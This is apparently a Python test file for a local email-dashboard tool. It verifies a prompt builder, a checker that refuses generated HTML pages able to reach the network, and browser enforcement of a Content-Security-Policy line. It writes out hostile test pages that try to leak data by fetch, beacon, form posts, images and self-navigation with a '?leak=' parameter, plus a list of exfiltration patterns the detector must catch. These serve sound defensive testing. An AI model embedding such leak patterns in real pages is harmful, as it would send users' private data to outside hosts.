"""
verify_dashboard_prompt.py — the PrivateGPT dashboard route, end to end.

Three parts:

  A. The prompt. It carries every item on the dashboard, in order, with the
     policy line verbatim, the instructions the page needs, and sensible
     limits — checked against the mock mailbox and against hand-built views.

  B. The page checker (page_check.py), against a realistic generated page
     and against each way a page could try to reach the network, including
     the harmless look-alikes it must NOT refuse.

  C. The browser. A real Chromium opens pages from disk (file://), exactly
     as double-clicking a saved page would. A local HTTP server stands in for
     the internet and records every request it receives. This proves:
       - with the policy line, a page that tries every kind of request gets
         none through, while its own inline script, styles and localStorage
         keep working;
       - without the policy line, the same page does get through (so the
         test can see requests when they happen);
       - a page that navigates itself away DOES get through despite the
         policy line — which is why the checker exists — and the checker
         refuses exactly that page.
     Part C needs Playwright with Chromium; without it, it is reported as
     SKIPPED rather than passed.

Run:  python tests\\verify_dashboard_prompt.py
"""

import http.server
import io
import logging
import os
import sys
import tempfile
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

import config  # noqa: E402

FAILURES = []
SKIPPED = []


def check(label, condition, detail=""):
    status = "PASS" if condition else "FAIL"
    print(f"  [{status}] {label}" + (f"  -> {detail}" if detail else ""))
    if not condition:
        FAILURES.append(label)


def rule(title):
    print(f"\n{'=' * 72}\n{title}\n{'=' * 72}")


# ---------------------------------------------------------------------------
# A page shaped like what PrivateGPT is asked to return
# ---------------------------------------------------------------------------

def sample_page(csp_line):
    """A compact page meeting every rule in the prompt."""
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
{csp_line}
<meta charset="utf-8">
<title>Jarvis overview</title>
<style>
  body {{ background: #0b0d17; color: #e6e8f2; font-family: "Segoe UI", system-ui, sans-serif; }}
  .card {{ background: #141827; border: 1px solid #232a40; border-radius: 16px; padding: 16px; }}
  .done {{ opacity: .5; text-decoration: line-through; }}
</style>
</head>
<body>
<header><h1>Good morning</h1><p>Two threads need a reply. See https://intranet.example/policy for context.</p></header>
<div class="filters"><button data-f="all">All</button><button data-f="reply">Needs my reply</button>
<input id="q" placeholder="Search"></div>
<section class="card" id="focus"><h2>Today's focus</h2>
<svg viewBox="0 0 100 100" width="80"><circle cx="50" cy="50" r="42" fill="none" stroke="#7c6cf6" stroke-width="8" id="ring"/></svg>
<ul>
 <li class="item" data-id="A1" data-kind="reply"><input type="checkbox" id="c-A1"> A1 Pre-qualification pack - status: open (waiting on Thomas)
  <details><summary>Draft</summary><pre id="d-A1">Hi Thomas, ...</pre><button class="copy" data-for="d-A1">Copy draft</button></details></li>
 <li class="item" data-id="N1" data-kind="waiting"><input type="checkbox" id="c-N1"> N1 Handover notes - Location: Teams</li>
</ul></section>
<script>
(function () {{
  var KEY = "jarvis-2026-09-23";
  var state = {{}};
  try {{ state = JSON.parse(localStorage.getItem(KEY) || "{{}}"); }} catch (e) {{}}
  var boxes = document.querySelectorAll(".item input[type=checkbox]");
  function update() {{
    var done = 0;
    boxes.forEach(function (b) {{
      var li = b.closest(".item"); li.classList.toggle("done", b.checked);
      if (b.checked) {{ done++; }}
      state[li.getAttribute("data-id")] = b.checked;
    }});
    localStorage.setItem(KEY, JSON.stringify(state));
    document.getElementById("ring").setAttribute("data-percent",
      Math.round(100 * done / boxes.length));
  }}
  boxes.forEach(function (b) {{
    b.checked = !!state[b.closest(".item").getAttribute("data-id")];
    b.addEventListener("change", update);
  }});
  update();
  if (location.hash === "#reply") {{ /* reading the hash is fine */ }}
  var location_label = "Teams";
  document.querySelectorAll(".copy").forEach(function (btn) {{
    btn.addEventListener("click", function () {{
      var text = document.getElementById(btn.getAttribute("data-for")).textContent;
      if (navigator.clipboard) {{ navigator.clipboard.writeText(text); }}
    }});
  }});
  document.body.setAttribute("data-ready", "yes");
}})();
</script>
</body>
</html>
"""


def hostile_page(csp_line, port):
    """Tries every kind of request a page can make by itself."""
    base = f"http://127.0.0.1:{port}"
    return f"""<!DOCTYPE html>
<html><head>
{csp_line}
<meta charset="utf-8">
<style>
  @font-face {{ font-family: Leak; src: url({base}/font.woff2); }}
  body {{ background-color: rgb(11, 13, 23); font-family: Leak, sans-serif; }}
  .bg {{ width: 10px; height: 10px; background-image: url({base}/background.png); }}
</style>
<link rel="stylesheet" href="{base}/style.css">
<script src="{base}/script.js"></script>
</head><body>
<div class="bg"></div>
<img src="{base}/image.png" alt="">
<iframe src="{base}/frame.html"></iframe>
<form id="f" method="post" action="{base}/form"><input name="leak" value="1"></form>
<script>
  document.body.setAttribute("data-inline", "ran");
  try {{ localStorage.setItem("probe", "1");
        document.body.setAttribute("data-storage", localStorage.getItem("probe")); }}
  catch (e) {{ document.body.setAttribute("data-storage", "error"); }}
  try {{ fetch("{base}/fetch").catch(function () {{}}); }} catch (e) {{}}
  try {{ var x = new XMLHttpRequest(); x.open("GET", "{base}/xhr"); x.send(); }} catch (e) {{}}
  try {{ new WebSocket("ws://127.0.0.1:{port}/socket"); }} catch (e) {{}}
  try {{ navigator.sendBeacon("{base}/beacon", "leak"); }} catch (e) {{}}
  try {{ new Image().src = "{base}/image-from-script.png"; }} catch (e) {{}}
  try {{ new EventSource("{base}/events"); }} catch (e) {{}}
  try {{ document.getElementById("f").submit(); }} catch (e) {{}}
</script>
</body></html>
"""


def navigating_page(csp_line, port):
    return f"""<!DOCTYPE html>
<html><head>
{csp_line}
<meta charset="utf-8"></head><body>
<script>
  setTimeout(function () {{
    window.location.href = "http://127.0.0.1:{port}/navigate?leak=" +
      encodeURIComponent(document.title || "data");
  }}, 50);
</script>
</body></html>
"""


# ---------------------------------------------------------------------------
# A: the prompt
# ---------------------------------------------------------------------------

def part_a():
    import prompt_builder as pb

    rule("A1. Built from the mock mailbox")
    workdir = tempfile.mkdtemp(prefix="jarvis_dash_prompt_")
    config.OUTLOOK_BACKEND = "mock"
    config.DB_PATH = os.path.join(workdir, "jarvis.db")
    config.LOG_PATH = os.path.join(workdir, "sync.log")
    import app as app_module
    import dashboard
    import db
    import sync
    sync.configure_logging(level=logging.INFO, console=False)
    db.init_db()
    sync.run_sync()
    view = dashboard.build_view()
    text = pb.build_dashboard_prompt(view)

    check("opens with the versioned header",
          text.startswith(f"=== PRIVATEGPT DASHBOARD PROMPT "
                          f"(v{config.DASHBOARD_PROMPT_VERSION}) ==="))
    check("ends with the end marker", text.rstrip().endswith("=== END OF PROMPT ==="))
    check("carries the policy line verbatim", pb.CSP_LINE in text)
    check("the policy line blocks everything by default",
          "default-src 'none'" in pb.CSP_LINE and "form-action 'none'" in pb.CSP_LINE
          and "base-uri 'none'" in pb.CSP_LINE)
    for key, prefix in (("overdue_inbound", "A"), ("awaiting_reply", "N"),
                        ("meetings", "M")):
        items = view[key]
        check(f"every {key} item is in the prompt ({len(items)})",
              all(i["subject"] in text for i in items))
        check(f"{key} items are numbered {prefix}1..{prefix}{len(items)}",
              all(f"{prefix}{n}. " in text for n in range(1, len(items) + 1))
              and f"{prefix}{len(items) + 1}. " not in text)
    check("section counts match the dashboard",
          f"unanswered ({len(view['overdue_inbound'])})" in text
          and f"no reply yet ({len(view['awaiting_reply'])})" in text
          and f"UPCOMING MEETINGS ({len(view['meetings'])})" in text)
    check("attachment names included", "budget_q3_v2.xlsx" in text)
    check("direct questions flagged", "Flag: contains a direct question" in text)
    check("forwarded threads explained", "I forwarded this thread" in text)
    check("meeting flags spelled out", "not yet accepted or declined" in text
          and "no preparation found" in text)
    check("missing bodies say so rather than go blank",
          "Their last message: (none)" in text)
    check("the page brief asks for the working features",
          all(s in text for s in ("checkbox", "Copy draft", "localStorage",
                                  "Needs my reply", "progress ring",
                                  "search box")))
    check("the localStorage key carries today's date",
          f"jarvis-{view['now'].astimezone():%Y-%m-%d}" in text)
    check("the model is told not to invent anything",
          "Base everything only on the data provided" in text)
    words = len(text.split())
    check("a manageable length", 600 < words < 4000, f"{words} words")

    template = pb._DASHBOARD_TEMPLATE
    check("the template is plain ASCII (safe across encodings)",
          all(ord(c) < 128 for c in template))

    rule("A2. Limits and edges")
    long_body = " ".join(f"word{n}" for n in range(200))
    many = {"overdue_inbound": [
        {"subject": f"Item {n}", "days_waiting": n, "date_display": "x",
         "counterparties": [{"name": f"P{n}", "address": f"p{n}@x.dk"}],
         "their_last_message": long_body, "attachments": []}
        for n in range(config.DASHBOARD_PROMPT_MAX_ITEMS + 5)],
        "awaiting_reply": [], "meetings": []}
    big = pb.build_dashboard_prompt(many)
    check("sections are capped with an explicit note",
          f"A{config.DASHBOARD_PROMPT_MAX_ITEMS}. " in big
          and f"A{config.DASHBOARD_PROMPT_MAX_ITEMS + 1}. " not in big
          and "5 older item(s) omitted" in big)
    check("snippets are truncated and marked",
          f"[... truncated at {config.DASHBOARD_PROMPT_SNIPPET_WORDS} words]" in big
          and "word199" not in big)
    empty = pb.build_dashboard_prompt({"overdue_inbound": [],
                                       "awaiting_reply": [], "meetings": []})
    check("an empty dashboard still builds a valid prompt",
          empty.count("(none)") == 3 and pb.CSP_LINE in empty)

    rule("A3. Registry, versioning and the API")
    types = {t["type"]: t for t in pb.available_types()}
    check("follow-up is still the first type",
          pb.available_types()[0]["type"] == "followup")
    check("dashboard is registered as a whole-view prompt",
          types.get("dashboard", {}).get("scope") == "view")
    try:
        pb.build(view["overdue_inbound"][0], "dashboard")
        refused = False
    except ValueError:
        refused = True
    check("a row cannot be built as a dashboard prompt", refused)
    check("the changelog records the dashboard version",
          any(t == "dashboard" and v == config.DASHBOARD_PROMPT_VERSION
              for v, _, t, _ in pb.PROMPT_CHANGELOG))

    client = app_module.create_app().test_client()
    response = client.get(f"{config.API_PREFIX}/prompt/dashboard").get_json()
    def without_timestamp(prompt):
        return "\n".join(line for line in prompt.splitlines()
                         if not line.startswith("Generated:"))
    check("GET /prompt/dashboard returns the same prompt",
          response["ok"]
          and without_timestamp(response["prompt"]) == without_timestamp(text))
    check("…with the policy line and its size",
          response["csp_line"] == pb.CSP_LINE and response["words"] > 0)
    for handler in logging.getLogger().handlers:
        handler.flush()
    log_text = io.open(config.LOG_PATH, encoding="utf-8").read()
    check("the handover is logged by size", "Built dashboard prompt v" in log_text)
    check("…but no content goes into the log",
          not any(i["subject"] in log_text for i in view["overdue_inbound"]))
    return client


# ---------------------------------------------------------------------------
# B: the page checker
# ---------------------------------------------------------------------------

def part_b(client):
    import page_check as pc
    import prompt_builder as pb

    csp = pb.CSP_LINE
    head = f"<!DOCTYPE html><html><head>\n{csp}\n<meta charset='utf-8'></head><body>\n"
    tail = "\n</body></html>"

    def verdict(body):
        return pc.check_page(head + body + tail)

    rule("B1. A well-formed generated page passes")
    good = pc.check_page(sample_page(csp))
    check("the sample page is safe", good["verdict"] == "safe",
          str([f["rule"] for f in good["blocking"]]))
    check("…with nothing advisory either", not good["advisory"],
          str([f["rule"] for f in good["advisory"]]))
    fenced = pc.check_page("```html\n" + sample_page(csp) + "\n```")
    check("pasted with its ```html fence still passes", fenced["verdict"] == "safe")

    rule("B2. The policy line must be present, intact and first")
    cases = {
        "missing": sample_page(""),
        "loosened": sample_page(csp.replace("default-src 'none'", "default-src *")),
        "inside a comment": sample_page("<!-- " + csp + " -->"),
        "after the styles": sample_page("").replace("</style>", "</style>\n" + csp),
        "in the body": sample_page("").replace("<body>", "<body>\n" + csp),
    }
    for label, page in cases.items():
        result = pc.check_page(page)
        check(f"policy {label} -> refused", result["verdict"] == "unsafe"
              and result["blocking"][0]["rule"].startswith("policy"),
              f"csp={result['csp']}")

    rule("B3. Anything that could leave is refused")
    leaks = {
        "remote script": '<script src="https://cdn.example.com/x.js"></script>',
        "protocol-relative script": '<script src="//cdn.example.com/x.js"></script>',
        "remote stylesheet": '<link rel="stylesheet" href="https://fonts.example/css">',
        "remote image": '<img src="http://tracker.example/p.gif">',
        "srcset": '<img srcset="https://x.example/a.png 2x">',
        "CSS url()": '<div style="background:url(https://x.example/a.png)"></div>',
        "CSS @import": "<style>@import 'x.css';</style>",
        "base element": '<base href="https://x.example/">',
        "meta refresh": '<meta http-equiv="refresh" content="0;url=https://x.example">',
        "link out": '<a href="https://x.example/?d=1">more</a>',
        "location.href =": "<script>location.href = 'https://x.example/?' + d;</script>",
        "window.location =": "<script>window.location = u;</script>",
        "bare location =": "<script>location = u;</script>",
        "document.location.href =": "<script>document.location.href = u;</script>",
        "top.location.replace(": "<script>top.location.replace(u);</script>",
        "location.assign(": "<script>location.assign(u);</script>",
        "window.open(": "<script>window.open(u);</script>",
        "bare open(": "<script>open(u);</script>",
        "onclick navigation": '<button onclick="location.href=u">x</button>',
        "javascript: link": '<a href="javascript:window.open(u)">x</a>',
        "make a link and click it":
            "<script>var a = document.createElement('a'); a.href = u; a.click();</script>",
    }
    for label, body in leaks.items():
        result = verdict(body)
        check(f"{label} -> refused", result["verdict"] == "unsafe",
              str([f["rule"] for f in result["blocking"]]))

    double = verdict("<script>window.location.href = 'https://x.example/';</script>")
    check("one line flagged by two rules is reported once, most specific first",
          len(double["blocking"]) == 1
          and double["blocking"][0]["rule"] == "script-navigation",
          str([f["rule"] for f in double["blocking"]]))

    rule("B4. Harmless look-alikes are NOT refused")
    benign = {
        "a URL in the text": "<p>See https://intranet.example/policy</p>",
        "'open (' in prose": "<p>Status: open (waiting on Lars)</p>",
        "'location = Teams' in prose": "<p>location = Teams</p>",
        "reading location.hash": "<script>if (location.hash === '#x') {}</script>",
        "setting location.hash": "<script>location.hash = '#reply';</script>",
        "a variable called location": "<script>const location = m.location;</script>",
        "details.open": "<script>d.open = true;</script>",
        "an in-page anchor": '<a href="#focus">Focus</a>',
        "a data: image": '<img src="data:image/png;base64,iVBOR">',
        "click handlers": "<script>b.addEventListener('click', f); b.onclick = g;</script>",
    }
    for label, body in benign.items():
        result = verdict(body)
        check(f"{label} -> accepted", result["verdict"] == "safe",
              str([(f["rule"], f["excerpt"][:40]) for f in result["blocking"]]))

    rule("B5. Calls the policy blocks are listed, not refused")
    for label, body in {"fetch": "<script>fetch('/x')</script>",
                        "XMLHttpRequest": "<script>new XMLHttpRequest()</script>",
                        "WebSocket": "<script>new WebSocket('/s')</script>",
                        "a form": "<form></form>",
                        "an iframe": "<iframe></iframe>"}.items():
        result = verdict(body)
        check(f"{label} -> advisory", result["verdict"] == "safe"
              and result["advisory"], str([f["rule"] for f in result["advisory"]]))

    rule("B6. Through the API")
    prefix = config.API_PREFIX
    ok = client.post(f"{prefix}/check-page",
                     json={"source": sample_page(csp)}).get_json()
    check("a good page -> safe", ok["ok"] and ok["verdict"] == "safe")
    bad = client.post(f"{prefix}/check-page",
                      json={"source": navigating_page(csp, 1)}).get_json()
    check("a navigating page -> unsafe, with the line number",
          bad["verdict"] == "unsafe" and bad["blocking"][0]["line"])
    check("an empty request is rejected",
          client.post(f"{prefix}/check-page", json={}).status_code == 400)
    check("an oversized request is rejected",
          client.post(f"{prefix}/check-page",
                      json={"source": "x" * 5_000_001}).status_code == 400)


# ---------------------------------------------------------------------------
# C: in a real browser
# ---------------------------------------------------------------------------

class _Recorder(http.server.BaseHTTPRequestHandler):
    hits = []

    def _record(self):
        _Recorder.hits.append(self.path)
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"/* reached */")

    do_GET = do_POST = _record

    def log_message(self, *args):
        pass


def _chromium_path():
    for candidate in (os.environ.get("JARVIS_TEST_CHROMIUM"),
                      "/opt/pw-browsers/chromium"):
        if candidate and os.path.exists(candidate):
            return candidate
    return None


def part_c():
    import page_check as pc
    import prompt_builder as pb

    rule("C. A real browser opening saved pages from disk")
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("  SKIPPED: Playwright is not installed here, so pages cannot "
              "be opened in a real browser.")
        SKIPPED.append("browser enforcement")
        return

    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Recorder)
    port = server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()
    folder = tempfile.mkdtemp(prefix="jarvis_pages_")

    def save(name, text):
        path = os.path.join(folder, name)
        io.open(path, "w", encoding="utf-8").write(text)
        return __import__("pathlib").Path(path).as_uri()

    def visit(page, url, settle=2.0):
        # Wait for the navigation to commit, then watch for a fixed time.
        # Not for "load": a page whose requests are being refused, or that
        # submits a form, may never fire it, and what is being measured is
        # the requests made in the window, not whether the page finished.
        _Recorder.hits.clear()
        page.goto(url, wait_until="commit")
        time.sleep(settle)
        return list(_Recorder.hits)

    with sync_playwright() as p:
        executable = _chromium_path()
        try:
            browser = p.chromium.launch(executable_path=executable) \
                if executable else p.chromium.launch()
        except Exception as exc:  # noqa: BLE001
            print(f"  SKIPPED: no Chromium available ({exc.__class__.__name__}).")
            SKIPPED.append("browser enforcement")
            server.shutdown()
            return
        page = browser.new_page()

        protected = save("protected.html", hostile_page(pb.CSP_LINE, port))
        hits = visit(page, protected)
        check("WITH the policy line: no request of any kind gets out",
              hits == [], f"{len(hits)} request(s): {hits[:6]}")
        check("…while the page's own script still runs",
              page.get_attribute("body", "data-inline") == "ran")
        check("…its own styles still apply",
              page.evaluate("getComputedStyle(document.body).backgroundColor")
              == "rgb(11, 13, 23)")
        check("…and localStorage works from a saved file",
              page.get_attribute("body", "data-storage") == "1")

        exposed = save("exposed.html", hostile_page("", port))
        hits = visit(page, exposed)
        kinds = {h.split("?")[0] for h in hits}
        check("WITHOUT it, the same page does reach the network "
              "(so the test above could see requests)",
              len(kinds) >= 5, f"{len(kinds)} kinds: {sorted(kinds)}")

        navigating = navigating_page(pb.CSP_LINE, port)
        hits = visit(page, save("navigating.html", navigating))
        check("a page that navigates itself DOES get out despite the policy",
              any(h.startswith("/navigate?leak=") for h in hits), str(hits))
        check("…which is exactly what the checker refuses",
              pc.check_page(navigating)["verdict"] == "unsafe")

        rule("C2. A page meeting the prompt actually works under the policy")
        sample = save("sample.html", sample_page(pb.CSP_LINE))
        hits = visit(page, sample, settle=0.8)
        check("it loads with no requests", hits == [], str(hits))
        check("its script ran", page.get_attribute("body", "data-ready") == "yes")
        page.check("#c-A1")
        check("ticking an item updates the ring",
              page.get_attribute("#ring", "data-percent") == "50")
        page.reload(wait_until="commit")
        time.sleep(0.8)
        check("ticks survive a reload (localStorage)",
              page.is_checked("#c-A1") and not page.is_checked("#c-N1"))
        check("done items are struck through",
              "done" in (page.get_attribute("li[data-id=A1]", "class") or ""))
        browser.close()
    server.shutdown()


def main():
    client = part_a()
    part_b(client)
    try:
        part_c()
    except Exception as exc:  # noqa: BLE001 - a browser error is a failure
        check("the browser checks ran to completion", False,
              f"{exc.__class__.__name__}: {str(exc).splitlines()[0]}")

    print(f"\n{'=' * 72}")
    if FAILURES:
        print(f"{len(FAILURES)} CHECK(S) FAILED:")
        for item in FAILURES:
            print(f"  - {item}")
        return 1
    if SKIPPED:
        print("All checks that could run passed. SKIPPED: "
              + ", ".join(SKIPPED) + " (needs Playwright + Chromium).")
        return 0
    print("All dashboard-prompt checks passed, including in a real browser.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
